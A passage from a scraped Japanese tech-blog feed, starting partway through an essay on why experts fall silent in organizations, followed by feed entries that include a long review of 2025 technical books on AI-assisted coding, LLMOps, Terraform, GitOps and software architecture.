態度だ。振りかざすとは、自分の世界から一歩も出ないまま、相手に自分の言葉を投げつけること。相手が理解できないなら、相手が悪い。対話とは、自分の世界を一度脇に置いて、相手の世界に足を踏み入れること。相手の言葉で考え、相手の文脈で説明する。これは、とても難しい。そして、とても面倒くさい。対話のコストを払える組織対話には膨大なコストがかかる。相手の世界を理解するために時間をかける。相手の言葉で説明するために言葉を選ぶ。ずれが生じたら、丁寧に修正する。誤解が生まれたら、根気強く解きほぐす。このコストを、組織が払えるかどうか。「今月のリリースが優先だ」「そんな時間はない」「とにかく早く作れ」という組織では、対話のコストは払えない。対話に時間をかける人は「仕事が遅い人」として評価を下げられる。対話のコストを払える組織とは、どういう組織か。意思決定のプロセスに専門家を巻き込む組織。評価制度が「言われたものを早く作る」ではなく「価値あるものを作る」を評価する組織。専門家の意見が「めんどくさいこと」ではなく「必要なこと」として扱われる組織。そして、相手の世界を理解しようとする姿勢が、当たり前のこととして共有されている組織。対立を放っておかない対立は放っておくと腐る。私自身、何度も失敗した。相手の話を遮って、自分の正しさを主張して、結局何も変わらなかった。そのたびに学んだのは、急いで反応しないことの価値だ。対立を放っておくと気まずさが積み重なる。仕事の判断がぶれ、人が協力しにくくなる。でも、対立が起きた瞬間に「正しさ」で押し切ろうとすると、もっと悪くなる。私はそれを何度も経験した。だから今は、衝突の場面では一度立ち止まるようにしている。相手の話を最後まで聞く。相手が何を恐れているのか、何を守ろうとしているのかを理解しようとする。それだけで、相手の硬さがゆるむことがある。争点をはっきりさせると、不要な言い合いが減る。「ここは合意できる」「ここは意見が違う」と整理するだけで、議論が前に進む。小さな合意を積み上げると、相手への不信が弱まる。これは言うのは簡単だが、やるのは難しい。私も何度も失敗した。でも、やる価値はある。専門家が話せる組織を作るというのは、対立を避けることではない。対立が起きたときに、それを丁寧に扱える組織を作ることだ。「あなたになら話したい」専門家が話すのは、話しても大丈夫だと思える相手に対してだけだ。自分の言葉が曲解されない。余計な解釈を加えられない。「そういうことではない」と釈明する必要がない。相手が自分の世界を理解しようとしてくれている。そういう相手に対してだけ、専門家は話す。「あなたになら話したい」——この感覚が、専門家に話をさせる。話すことのリスクでも、「あなたになら話したい」と思える相手は、実はとても少ない。専門家が話さないのは、構造の問題だけではない。話すこと自体に、あまりにもリスクがある。曲解される。余計なことを言われる。釈明が必要になる。プライドを刺激する。張り合われる。情報を軽々しく扱われる。他の人に言いふらされる。これだけのリスクを負って、それでも話す価値があるか。多くの場合、ない。だから専門家は黙る。専門知識を振りかざすどころか、そもそも口を開かない。コミュニケーションの不可避的なずれどれだけ丁寧に対話しても、ずれは生じる。私が話したい出来事が言葉となって口から出た時点で、それは私のものではなくなる。相手がどう受け取るかは、相手次第だ。これは、いかなるコミュニケーションにおいても不可避だ。だからこそ、対話のコストを払う意志があるかどうかが重要になる。ずれが生じたときに、「そういうことではない」と切り捨てるのではなく、「どうずれているのか」を一緒に探る。誤解が生まれたときに、「わかってないですね」と責めるのではなく、「どう誤解されたのか」を一緒に確認する。そして、聞いたことを軽々しく他の人に話さない。他者の情報を、自分の優越感のために消費しない。そのコストを払う意志があり、その倫理観を共有できる組織に対してだけ、専門家は話す。組織に期待しても仕方ない専門家が専門家としてリスペクトされる組織。フジイさんが描く理想は、私も心から望んでいる。でも、そういう組織を期待して待っていても、来ない。組織が変わるのを待っていたら、専門家は永遠に黙ったままだ。「いつか理解してくれる組織に出会えるはず」「いつかリスペクトされる日が来るはず」。そう思って待っていても、その日は来ない。だから、専門家の側から動くしかない。振りかざすのではなく、対話する。相手の世界に入っていく。相手の言葉で、相手の文脈で、自分の知っていることを伝える。面倒くさいけど、そのコストを自分から払う。組織が対話のコストを払ってくれるのを待つのではなく、自分から払う。相手が自分の世界を理解してくれるのを待つのではなく、自分から相手の世界を理解しにいく。これは不公平だ。専門家の側だけが努力するのはおかしい。でも、待っていても状況は変わらない。専門家に「振りかざせ」と言うのは、順番が逆だ。でも、「組織が変われ」と言うのも、期待しすぎだ。組織は簡単には変わらない。変わるのを待っていたら、自分が消耗するだけだ。だから、自分から動く。対話のコストを、自分から払う。専門家は話さない、でも専門家は話さない。話しても届かないから。話しても曲解されるから。話しても釈明が面倒くさいから。話したことを軽々しく扱われるから。他人を嫌いになりたくないから。専門家の言葉が届かなくなった組織では、専門家は黙る。それは怠慢ではない。何度も壁にぶつかった結果の、合理的な適応だ。でも、黙ったままでいいのか。フジイさんの理想は素晴らしい。専門家がリスペクトされる組織。専門家が力をセーブせずに振るえる組織。私もそういう組織で働きたい。でも、そういう組織を待っていても来ない。だから、自分から動くしかない。振りかざすのではなく、対話する。面倒くさいけど、相手の世界に入っていく。組織が変わるのを待つのではなく、自分から対話のコストを払う。「あなたになら話したい」——そう思ってもらえる相手に、自分からなる。組織に期待するのではなく、自分がその一人目になる。振りかざせと言う前に、自分から対話のコストを払う。それが、専門家として生き残る唯一の方法だと、私は思っている。私もまだ道半ばだ。何度も失敗するし、面倒くさいと思うこともある。でも、やるしかない。一緒にやっていこう。おわりにここまで書いてきて、ふと思う。結局、私は何を言いたかったんだろう。「専門家は話さない」という事実を伝えたかったのか。「組織に期待するな」と言いたかったのか。「自分から動け」と説教したかったのか。たぶん、どれでもない。私が本当に言いたかったのは、「話さないことを選んでいる自分を、責めなくていい」ということかもしれない。黙っているのは怠慢じゃない。何度も壁にぶつかって、学習した結果だ。それは合理的な適応だ。でも同時に、「黙ったままでいいのか」という問いも、ずっと抱えている。この矛盾を、私はまだ解決できていない。だから、「自分から対話のコストを払う」という答えを、自分自身に言い聞かせているのかもしれない。フジイさんの記事に対する反論というより、自分への言い訳、あるいは自分への励まし。そういう側面もあると思う。この文章を読んで、「わかる」と思ってくれた人がいたら嬉しい。「違う」と思った人もいるだろう。それでいい。ただ、もし同じような経験をして、同じように黙ることを選んでいる人がいたら、伝えたい。あなたは間違っていない。でも、黙ったままでいいのか、という問いは、たぶん消えない。その問いと一緒に、私はこれからも対話のコストを払い続けるんだと思う。面倒くさいけど。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。","isoDate":"2025-12-12T07:32:20.000Z","dateMiliSeconds":1765524740000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud Workstations入門: 安全かつ再現可能な開発環境の作り方","link":"https://qiita.com/aminevg/items/b953ae647c81eef59e95","contentSnippet":"この記事は 3-shake Advent Calendar 2025 (12 日目) の投稿です。こんにちは！ スリーシェイクのイリドリシ愛民 (@realaminevg) です。最近は主にクライアントワークを行なっているため、セキュリティやオンボーディングを徹底する必...","isoDate":"2025-12-11T22:08:14.000Z","dateMiliSeconds":1765490894000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"NVIDIA NeMo Agent Toolkitを使ってみた","link":"https://sreake.com/blog/how-to-use-nvidia-nemo-agent-toolkit/","contentSnippet":"概要 こんにちは佐藤慧太@SatohJohnです。 NVIDIA NeMo Agent Toolkit（以下、この記事ではNATと呼ぶことにします）は生成AIに関する様々なツール・フレームワーク・言語モデルを組み合わせて […]The post NVIDIA NeMo Agent Toolkitを使ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-12-11T13:35:36.000Z","dateMiliSeconds":1765460136000,"authorName":"Sreake","authorId":"Sreake"},{"title":"登壇記録：NVIDIA NIMとNVIDAI NeMo Guardrailsの紹介","link":"https://zenn.dev/akasan/articles/nvidia_nim_nemo_toudann","contentSnippet":"今回は本日以下のイベントで登壇しましたので、そちらの資料の共有と簡単な概要の共有になります。https://3-shake.connpass.com/event/373638/ 登壇資料の共有今回の登壇資料は以下のspeackerdeckにアップロードしておりますのでぜひご覧ください。 登壇内容今回の登壇では主に以下のトピックについて取り扱いました。NVIDIA NIMを用いた最適化された環境でのモデルのサービングについてgarakを用いたLLMの脆弱性診断NeMo Guardrailsを用いたLLMに対するガードレールの設定LLMをアプリケーションを組み込む...","isoDate":"2025-12-11T13:28:09.000Z","dateMiliSeconds":1765459689000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"2025年 俺が愛した本たち 技術書編","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/11/104143","contentSnippet":"はじめに「今年読んで良かった本」という記事を書こうとしている自分に、ふと気づく。また書くのか。毎年書いている。誰に頼まれたわけでもないのに、12月になると決まってこの作業を始めてしまう。習慣なのか、義務感なのか、それとも単なる自己顕示欲なのか。たぶん、全部だ。100冊近く読んだ、と書こうとして手が止まる。この数字を出した瞬間、どこかで「すごいですね」と言われたい自分がいる。同時に、「いや、冊数なんて意味ないですから」と予防線を張りたがっている自分もいる。めんどくさい人間だ。でも正直に言えば、100冊読んだことより、1冊を血肉にできた人のほうがよほど偉いと本気で思っている。思っているのに、冊数を書いてしまう。そういう矛盾を抱えたまま、この文章を書いている。AIに聞けば答えは返ってくる。2025年はそういう年だった。コードを書いてもらい、設計を相談し、ドキュメントを要約させた。便利だ。本当に便利だ。では、なぜ本を読むのか。300ページもある本を、わざわざ最初から最後まで読む必要があるのか。たぶん、効率の悪さが必要なのだ。AIは正解を返してくれる。でも正解だけでは、何かが足りない。正解を得ることだけが目的なら、エンジニアをやっている意味がない。でも、そうじゃないはずだ。著者が失敗した話。遠回りした話。「今思えば、あれは間違いだった」という告白。そういう「ノイズ」が、不思議と頭に残る。正解は忘れる。でも、誰かの失敗談は覚えている。本を読んでいる時間、私は著者と対話している。いや、対話というより、ほとんど独り言だ。「それはそうだろう」と頷いたり、「いや、それは違うんじゃないか」と反発したりする。声には出さないけれど、頭の中ではずっと喋っている。その過程で、借り物の知識が少しずつ自分の言葉に変わっていく。検索では得られないもの。それを「身体性」と呼ぶのは大げさかもしれないけれど、他に適切な言葉が見つからない。読んだだけでは意味がない、と言われてきた。アウトプットしないと身につかない。実践しないと血肉にならない。わかっている。わかっているけれど、私は本を読むこと自体が好きなのだ。ページをめくる時間が好きだ。知らない概念や文脈に出会う瞬間が好きだ。だからブログを書き、登壇し、実務で試してきた。好きなことを正当化するために、アウトプットという免罪符を手に入れようとしていたのかもしれない。以下に紹介する26冊は、今年の「ベスト」ではない。そんな客観的な評価ができるほど、私は公平な人間ではない。単に「私に刺さった本」を並べただけだ。他の人には響かないかもしれない。でも、この26冊との出会いが、私の2025年を形作った。それだけは確かなことだ。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。はじめに昨年以前に紹介した本2025年に読んでよかった技術書Beyond Vibe CodingLLMOpsGenerative AI Design PatternsBuilding Applications with AI AgentsLearning GitHub CopilotTerraform in DepthArgo CD: Up and RunningEffective Platform EngineeringData Engineering Design Patternsソフトウェア設計の結合バランスFacilitating Software ArchitectureArchitecture ModernizationBuilding Event-Driven Microservices, 2nd EditionTaming Your Dragon: Addressing Your Technical DebtRefactoring to RustJust Use Postgres!The Software Engineer\'s Guidebookバックエンドエンジニアのためのインフラ・クラウド大全作る、試す、正す。アジャイルなモノづくりのための全体戦略良いコードの道しるべClean Code, 2nd Edition型システムのしくみFundamentals of Software EngineeringThe Product-Minded EngineerThe Engineering Leader\\"Looks Good to Me\\"おわりに昨年以前に紹介した本2022年 俺が愛した本たち 技術書編 - じゃあ、おうちで学べる2023年 俺が愛した本たち 技術書編 - じゃあ、おうちで学べる2023年 俺が愛した本たち 非技術書編 - じゃあ、おうちで学べる2024年 俺が愛した本たち 技術書編 - じゃあ、おうちで学べる2024年 俺が愛した本たち 非技術書編(物語を除く) - じゃあ、おうちで学べる2025年に読んでよかった技術書Beyond Vibe Codinglearning.oreilly.comwww.oreilly.co.jp※日本語翻訳版が出版予定です。AIツールの導入が進む現場で、私が感じていた違和感がありました。生産性は上がっている。コードは早く書ける。しかし、チームメンバーがAI生成コードについて質問されたとき、「なぜこう書いたのか」を説明できない場面が増えている。Google ChromeチームのAddy Osmani氏による本書は、この違和感に「Vibe Coding」という名前を与えてくれました。Vibe Codingとは、AIが生成したコードを深く理解せずに受け入れてしまう傾向のことです。動くコードと、理解しているコードは違う——この区別は、個人の学習だけでなく、チームの品質管理にも直結します。レビューで「なぜこの実装なのか」と聞かれたとき、「AIがそう書いたから」では通らない。コードの責任は、書いた人間にある。著者は、AIを「単独で使うツール」ではなく「ペアプログラマ」として捉えることを提唱しています。この主張には同意するが、同時に違和感もある。ペアプログラマは、隣に座って一緒に考える存在だ。しかしAIは、こちらが何を求めているか察してくれない。問いを投げなければ答えは返ってこない。つまり、AIを「ペア」として機能させるためには、人間の側に「何を聞くべきか」を知っている力が必要になる。結局、AIを活かせるかどうかは、使う側の問いの質で決まる。ペアプログラマという比喩は美しいが、その美しさに甘えてはいけない。本書の終盤では、自律型コーディングエージェントがもたらす未来像が描かれています。テスト失敗時に自動で修正を試みたり、依存関係の更新PRを生成したりする世界。技術的には魅力的ですが、著者は冷静です。「AIが生成したコードの責任は、承認者にある」——この原則は変わらない。むしろ、エージェントが自律的に動くほど、人間による検証の重要性は高まる。この視点は、運用の現場を知っている人間には納得感があります。AIは相棒であって、魔法使いではない。本書は、その現実を直視しながら、AIとの協働をチームに根付かせるための実践的な指針を提供してくれます。Beyond Vibe Coding: From Coder to AI-Era Developer (English Edition)作者:Osmani, AddyO\'Reilly MediaAmazonLLMOpslearning.oreilly.comLLM（Large Language Model、大規模言語モデル）を本番環境で運用し始めると、従来のMLOpsの知見だけでは対応できない課題に直面します。モデルの挙動が予測しにくい、コストが桁違いに高い、出力の品質をどう保証するか分からない——そんな困難にぶつかったとき、本書を手に取りました。著者が掲げるLLMOpsの4つの目標——信頼性、スケーラビリティ、堅牢性、セキュリティ——を見たとき、既視感がありました。これは、システムを運用する人間が長年追求してきた目標と重なる。新しい技術領域でも、運用の本質は変わらない。これまで培ってきた原則は、LLMにも適用できる——その確信を得られたことは、本書を読んだ大きな収穫でした。しかし、ここで私は立ち止まる。「従来の原則が適用できる」という安心感は、危うさも孕んでいる。LLMには従来のシステムにはない難しさがあるからだ。従来のMLモデルは、入力に対して比較的予測可能な出力を返す。しかしLLMは、同じプロンプトでも異なる応答を返すことがある。そもそも「正しい出力とは何か」が曖昧なのです。従来のシステムでは「期待する出力」を定義できた。LLMでは、それ自体が困難になる。この不確実性を前提に、どうSLO（Service Level Objective、サービスレベル目標）を設計し、どうモニタリングするか。本書はその実践的なアプローチを示してくれます。コスト管理の章も現実的で良かった。LLMのAPI呼び出しは、従来のマイクロサービス呼び出しと比較して桁違いにコストがかかる。機能要件を満たすことと、コストを現実的な範囲に収めること。このトレードオフを意識した設計と運用の知見は、実務で即座に役立つものばかりです。「正しい出力」が定義できないシステムを、どう運用するか。答えは、まだ業界全体で模索中です。正解がないから、難しい。正解がないから、面白い。本書はその議論の出発点として、LLMを本番で動かす人が押さえておくべき基盤を提供してくれます。LLMOps: Managing Large Language Models in Production (English Edition)作者:Aryan, AbiO\'Reilly MediaAmazonGenerative AI Design Patternslearning.oreilly.comLLMを使ったアプリケーションを作り始めると、繰り返し同じような問題にぶつかります。ハルシネーション（AIが事実と異なる内容をもっともらしく生成してしまう現象）をどう防ぐか。長いコンテキストをどう扱うか。出力の品質をどう担保するか。これらの問題には、すでに先人たちが見つけた解決策がある。本書は、そうしたLLMの限界を克服するための32のデザインパターンを体系化した一冊です。RAG（Retrieval-Augmented Generation、検索拡張生成）、Chain of Thought（思考の連鎖）、Guardrails（安全装置）といったパターンは、今やLLMアプリケーション開発の共通言語になりつつあります。これらのパターンを知っているかどうかで、設計の議論がスムーズになるし、チーム内での認識合わせも早くなる。本書の価値は、単にパターンを列挙していることにあるのではありません。各パターンがなぜ必要か、どのような問題を解決するのか、そしてどのようなトレードオフがあるのか——その背景まで丁寧に解説している点にあります。例えば、RAGパターン。ハルシネーションの軽減策として有効なのは広く知られている。しかし本書は、RAGの導入がもたらす新たな課題も明確に指摘しています。ベクトルデータベースという新しいコンポーネントが加わり、監視対象と障害点が増える。検索の精度がLLMの出力品質を左右するため、検索システムの品質保証という新たな運用課題が生まれる。解決策は、新しい問題を連れてくる——技術選定の現場では、この現実を織り込んだ上で判断する必要があります。Chain of Thoughtパターンも同様です。複雑な推論を段階的に行わせることで出力精度が向上する。しかし、精度を上げれば、コストも上がる。APIコールが複数回になり、レイテンシーとコストが増加する。プロダクトとして許容できるコストとレイテンシーの範囲内で、どこまで精度を追求するか。このトレードオフは、技術だけでなくビジネス要件との兼ね合いで決まります。パターンを知っているかどうかで、設計の選択肢が変わる——本書は、パターンカタログとしても、チームでアーキテクチャを議論するための共通言語としても活用できます。Generative AI Design Patterns: Solutions to Common Challenges When Building GenAI Agents and Applications (English Edition)作者:Lakshmanan, Valliappa,Hapke, HannesO\'Reilly MediaAmazonBuilding Applications with AI Agentslearning.oreilly.comLLMを使ったアプリケーションの次のステップとして、AIエージェントへの関心が高まっています。単に質問に答えるだけでなく、タスクを自律的に実行するシステム。しかし、エージェントを本番環境に投入しようとすると、従来のシステム運用とは異なる課題に直面します。従来のAPIは、リクエストを送れば決まった形式でレスポンスが返ってくる。処理時間もおおよそ予測できる。しかしエージェントは違う。どんな行動を取るか予測しにくい。タスクによって実行時間が大きく変わる。外部サービスへの呼び出しも、エージェント自身が判断して行う。従来のSLOの考え方が、そのままでは通用しない。では、どう運用設計するのか。本書を読んで改めて考えさせられたのは、ガードレールの設計です。エージェントは自律的に動く。自律的に動くからこそ、想定外の行動を取る可能性がある。どこまで自律性を許し、どこで人間が介入するか。この境界線を曖昧にしたまま本番投入すると、インシデント時の対応が混乱します。自律的に動くものを、どこまで信頼するか。その答えを、運用設計の段階で明確にしておく必要がある。信頼の境界線を引くのは、AIではなく人間の仕事だ。本書はその設計指針を与えてくれます。Learning GitHub Copilotlearning.oreilly.comGitHub Copilotを使い始めたころ、私はこれを「賢いオートコンプリート」だと思っていました。しかし、最近のCopilotは違います。コード補完だけでなく、チャットで質問に答え、コードの説明を生成し、テストまで書いてくれる。開発ワークフロー全体を変革する可能性を持っている。その進化に追いつくために、本書を手に取りました。インフラエンジニアとしても興味深い内容が多かった。IaC（Infrastructure as Code、インフラのコード化）の自動化、マニフェスト（Kubernetesなどの設定ファイル）の生成、パイプラインの構築。私自身、本書のテクニックが役立った場面は少なくありません。ただ、便利になればなるほど、新しい課題も生まれます。AIが生成したコードを、誰がどうレビューするのか。生成されたコードにバグがあったとき、責任は誰にあるのか。「AIがそう書いたから」では済まされない。コードの責任は、承認した人間にある。便利さの代償は、新しい責任——その両面を理解した上でCopilotを活用していきます。楽になった分だけ、考える責任が増えた。Building Applications with AI Agents: Designing and Implementing Multiagent Systems (English Edition)作者:Albada, MichaelO\'Reilly MediaAmazonTerraform in Depthlearning.oreilly.comインフラをコードで管理する。Infrastructure as Code（IaC）は、もはや当たり前の実践になりました。その中でもTerraformは、クラウドを問わず広く使われている。しかし、基本的な使い方を覚えた後、どう深めていくか。本書は、TerraformとOpenTofuの両方をカバーしている点に惹かれて手に取りました。HashiCorpのライセンス変更以降、OpenTofuへの移行を検討している組織も多いでしょう。どちらを選んでも、基本的な概念やスキルは共通しています。ライセンスが変わっても、スキルは変わらない——その安心感は大きいと感じました。大規模環境でのTerraform運用では、ステート管理が最も頭を悩ませる課題の1つです。ステートとは、Terraformが管理するインフラの「現在の状態」を記録したファイルです。このファイルが壊れたり、実際のインフラと食い違ったりすると、意図しない変更が発生する危険がある。ステートが壊れたら、インフラが壊れる——この現実に正面から向き合う必要があります。インフラの信頼性を高めるためには、IaCの品質向上が不可欠です。アプリケーションコードにはテストを書くのが当たり前になっていますが、インフラコードはどうでしょうか。インフラコードも、テストなしには信頼できない——私はこの原則を実践に落とし込むために、本書を読みました。Terraform in Depth: Infrastructure as Code with Terraform and OpenTofu作者:Hafner, RobertManningAmazonArgo CD: Up and Runninglearning.oreilly.comIaCでインフラを定義できるようになったら、次はデプロイをどう自動化するか。GitOps（Gitリポジトリを中心にインフラやアプリケーションのデプロイを管理する手法）は、その答えの1つです。Gitリポジトリを唯一の真実の源とし、インフラの状態を宣言的に管理する。そのGitOpsの標準ツールとなったArgo CDを深く理解したくて手に取りました。公式ドキュメントには書かれていない設計判断の背景を知ることで、ツールの使い方だけでなく、思想を理解できると感じています。実践者が書いた本には、公式ドキュメントにはない「なぜ」がある——それが技術書を読む理由の1つです。大規模な環境でも管理可能なGitOpsワークフローを構築するためのテクニックを学べました。GitOpsの導入は、デプロイの信頼性を高めるだけではありません。変更管理の透明性が向上し、何か起きたときの原因追跡が容易になる。Gitを見れば、本番が分かる——宣言的なインフラ管理とGitによるバージョン管理の組み合わせは、チーム開発との相性が非常に良いと感じています。Argo CD: Up and Running: A Hands-On Guide to GitOps and Kubernetes (English Edition)作者:Block, Andrew,Hernandez, ChristianO\'Reilly MediaAmazonEffective Platform Engineeringwww.manning.comIaCやGitOpsを導入し、インフラの自動化が進むと、次の課題が見えてきます。これらのツールやプラクティスを、どうやって開発チーム全体に展開するか。個人が使いこなしていても、チーム全体のものにならなければ意味がない。プラットフォームエンジニアリングは、その課題に対するアプローチです。しかし、技術的に優れたプラットフォームを作っても、開発者に使ってもらえなければ意味がない。使われないプラットフォームは、存在しないのと同じ——この現実は、プラットフォームチームにいると身に染みてわかります。本書が一貫して主張するのは、プラットフォームを「プロダクト」として扱うというマインドセットです。プラットフォームチームはインフラを提供するだけでなく、開発者体験を向上させる製品を開発している。開発者は顧客であり、彼らのフィードバックを受けて改善を続ける。インフラチームではなく、プロダクトチームである——この視点の転換は、チームの動き方を根本から変えます。この主張には強く共感する一方で、現実の難しさも感じている。「開発者は顧客」と言うのは簡単だ。しかし、顧客である開発者の要望をすべて聞いていたら、プラットフォームは一貫性を失う。標準化と柔軟性のバランス。セキュリティと利便性のトレードオフ。「顧客の声を聞く」と「顧客の言いなりになる」は違う。プロダクトチームとして振る舞うなら、時には「それはできません」と言う勇気も必要になる。本書はその難しさにも触れているが、私はもっと掘り下げてほしかった。開発者の認知負荷を下げながら、システムの信頼性を維持する。このバランスは、簡単ではありません。抽象化しすぎると、開発者がトラブルシューティングできなくなる。抽象化が足りないと、認知負荷が下がらない。プラットフォームの成功は、開発者の生産性で測る——この原則を軸に、どこまで抽象化するかを判断していく必要があります。Effective Platform Engineering (English Edition)作者:Chankramath, Ajay,Alvarez, Sean,Oliver, Bryan,Cheneweth, NicManningAmazonチームトポロジー　価値あるソフトウェアをすばやく届ける適応型組織設計作者:マシュー・スケルトン,マニュエル・パイス日本能率協会マネジメントセンターAmazonData Engineering Design Patternslearning.oreilly.comプラットフォームを運用していると、アプリケーションだけでなくデータパイプラインの信頼性も課題になってきます。データはシステムの血液のようなもので、流れが止まれば、ビジネスも止まる。データエンジニアリングにおけるデザインパターンを学びたくて手に取りました。デザインパターンとは、繰り返し現れる問題に対する定石のようなものです。先人たちが試行錯誤の末にたどり着いた解決策が、パターンとして整理されている。パターンには、先人の失敗が詰まっている——だから学ぶ価値がある。データパイプラインの信頼性、データ品質のモニタリング、レイテンシーの管理。これらの課題は、従来のアプリケーション開発とは異なるアプローチが必要です。たとえば、データパイプラインでエラーが発生したとき、どう対処するか。エラーを無視すればデータ品質が下がる。かといって、パイプライン全体を停止させれば、正常なデータまで届かなくなる。本書が紹介するパターンの1つは、問題のあるレコードを別の場所に退避させて後から対処する、というものです。1件のエラーで、100万件を止めるな——このパターンを知っているかどうかで、障害発生時の影響範囲が大きく変わります。また、データが届かないことも障害です。この視点も重要でした。アプリケーションの障害は目に見えやすいですが、データパイプラインの遅延や欠損は気づきにくい。データの品質をどう保証するか。本書から多くのヒントを得ました。Data Engineering Design Patterns: Recipes for Solving the Most Common Data Engineering Problems (English Edition)作者:Konieczny, BartoszO\'Reilly MediaAmazonソフトウェア設計の結合バランスbook.impress.co.jpデータパイプラインでもアプリケーションでも、システムを構成する要素間の「結合」は避けて通れない課題です。疎結合が良い、密結合は悪い——そう教わってきたけれど、本当にそれだけで設計できるのか。この疑問に答えてくれるのが本書です。Vlad Khononov著『Balancing Coupling in Software Design: Universal Design Principles for Architecting Modular Software Systems』の翻訳本です。島田浩二さんの翻訳が秀逸で、原著の概念を自然な日本語で読めることに感謝しています。learning.oreilly.comしかし本書は、その固定観念を覆します。結合がなければ、ソフトウェアはシステムになれない。結合は悪ではない。結合は、システムを成り立たせる力だ。この主張を読んだとき、私は自分の設計判断を振り返った。「疎結合にしなければ」という呪縛に囚われて、過剰に分離したことはなかったか。分離した結果、かえって複雑になったことはなかったか。あった。確実にあった。マイクロサービスに分割したはいいが、サービス間の通信が増えて、障害の原因追跡が困難になった経験。本書の主張は、そうした失敗を言語化してくれた。本書の価値は、「結合」という概念を多次元で捉え直すところにあります。結合の強さだけでなく、結合の距離、結合の揮発性——複数の軸で分析することで、設計の判断基準が明確になる。これは手順書でもルールブックでもない。設計の意思決定に迷ったとき、インプットとして参照するための本です。どこまで結合を許容し、どこで切り離すか。その判断を支える思考の枠組みを、本書は与えてくれます。ある書評では「今後10年くらいの基礎知識になる」と評されていました。私も同感です。マイクロサービス、モジュラーモノリス、ドメイン駆動設計——どのアーキテクチャを選んでも、結合のバランスは避けて通れない。正解を教えてくれる本ではなく、正解を見つけるための視点をくれる本。そういう本こそ、長く手元に置いておきたい。ソフトウェア設計の結合バランス　持続可能な成長を支えるモジュール化の原則 (impress top gearシリーズ)作者:Vlad KhononovインプレスAmazonFacilitating Software Architecturelearning.oreilly.comsyu-m-5151.hatenablog.com結合のバランスを考え、設計判断を重ねていく。しかし、その判断は誰がするのか。アーキテクトの役割が変わりつつあります。一人の天才が全てを決める時代から、チーム全体でアーキテクチャを育てていく時代へ。アーキテクトは、決める人から、決められるようにする人へ——この変化は、私自身の仕事のやり方にも影響を与えています。本書が提唱するのは、決定の権限を分散しつつ、責任の所在を明確にするアプローチです。誰でもアーキテクチャに関する決定を下せる。しかし、その前に適切な人々から助言を求めなければならない。権限は分散されるが、責任は決定者に残る。このバランスが、スピードと品質のトレードオフを緩和してくれます。実務で特に役立っているのは、ADR（Architecture Decision Records、アーキテクチャ決定記録）の考え方です。なぜその設計判断をしたのかを記録しておく。これは、将来のインシデント対応や技術的負債の評価において価値がある。なぜこのシステムはこうなっているのか。その説明ができる状態を維持することは、チームの意思決定の質を高め、運用の効率化にも直結する。決定を記録しないのは、忘れるためである——だから記録が重要なのです。Facilitating Software Architecture: Empowering Teams to Make Architectural Decisions (English Edition)作者:Harmel-Law, AndrewO\'Reilly MediaAmazonArchitecture Modernizationlearning.oreilly.comsyu-m-5151.hatenablog.com設計判断を記録し、チームでアーキテクチャを育てる。しかし、既存のレガシーシステムはどうするのか。新規システムなら理想的なアーキテクチャを追求できるが、現実には10年、20年と動き続けているシステムがある。レガシーシステムのモダナイゼーションに関わった経験がある人なら、技術だけでは解決しない問題があることを知っているはずです。コードを書き直しても、組織構造や開発プロセスが同じままでは、また同じ問題が生まれる。コードだけを変えても、問題は戻ってくる——本書は、この現実を正面から扱っています。全てのシステムが同じ重要度ではない。競争優位の源泉となる部分と、汎用的な部分を区別し、限られたリソースをどこに集中すべきかを判断する。全部は直せない。だから、どこを直すか決める——この優先順位付けの考え方は、経営層との対話でも役立ちます。「なぜこのシステムを優先するのか」を説明できるようになる。Collaborative Software Design もかなり良かったので副読本としてオススメしたいです。システムだけを変えても、組織が変わらなければ意味がない——この全体像を把握することは、ソフトウェアに関わるすべての人にとって重要です。なぜこのシステムがこの設計になっているのか。なぜこのチームがこの範囲を担当しているのか。技術的な判断の背景には、組織の歴史や力学がある。それを理解することで、日々の判断もより適切になるし、関係者との対話もスムーズになります。Architecture Modernization: Socio-technical alignment of software, strategy, and structure (English Edition)作者:Tune, Nick,Perrin, Jean-GeorgesManningAmazonBuilding Event-Driven Microservices, 2nd Editionlearning.oreilly.comマイクロサービスを設計するとき、私たちはつい「サービス間の通信をどうするか」という問いから始めてしまう。しかし本書を読んで、その問いの立て方自体が間違っていたのかもしれないと気づかされました。Adam Bellemare氏による本書の初版は2020年に出版され、イベント駆動型アーキテクチャの実践的な指針として多くのエンジニアに読まれてきました。この第2版では、その後の技術進化と実践知が大幅に加筆されています。本書が冒頭で引用するマクルーハンの「媒体はメッセージである」という言葉が象徴的です。私たちがどのような通信手段を選ぶかが、システムの設計だけでなく、組織構造やチーム間のコミュニケーションまで規定してしまう。リクエスト・レスポンス型の同期通信を選べば、サービス間の密結合が生まれる。イベントストリームを選べば、疎結合と自律性が生まれる。技術選択は、組織の形を決める選択でもある——コンウェイの法則を逆手に取るような視点が、本書には一貫して流れています。著者が強調するのは、データ通信構造（Data Communication Structure）という概念です。ビジネスコミュニケーション構造（チームの編成）と実装コミュニケーション構造（コードとAPI）は多くの組織で意識されている。しかし、データをどう流通させるかという構造は、往々にして後回しにされる。その結果、他チームのデータが必要になるたびに、場当たり的なAPI連携やデータコピーが生まれ、システムは複雑化していく。データ通信構造の欠如が、モノリスを肥大化させる——この指摘は、私自身の経験とも重なります。イベント駆動型マイクロサービスの本質は、データを「イベント」として永続化し、それを組織全体で共有可能にすることにあります。プロデューサーはイベントを発行する責任だけを負い、コンシューマーは必要なイベントを自分のペースで消費して独自のデータモデルを構築する。この分離によって、サービス間の依存関係が劇的に減少する。データは、実装に閉じ込めるものではなく、流れるものである——この発想の転換が、本書の核心です。ただし、私はこの主張を手放しで受け入れているわけではない。イベント駆動型アーキテクチャには、リクエスト・レスポンス型にはない複雑さがある。イベントの順序保証、べき等性の担保、結果整合性への対応。「疎結合になる」という美しい言葉の裏には、新たな運用課題が潜んでいる。本書はその課題にも誠実に向き合っているが、現場で直面する泥臭い問題——たとえば、イベントスキーマの進化をどう管理するか、障害時のリカバリをどう設計するか——については、もっと深掘りしてほしかった部分もある。本書の価値は、イベント駆動型アーキテクチャの「なぜ」を丁寧に解説している点にあります。単にKafkaの使い方を説明するのではなく、なぜイベントストリームが必要なのか、なぜ従来のアプローチでは限界があるのかを、組織論まで含めて論じている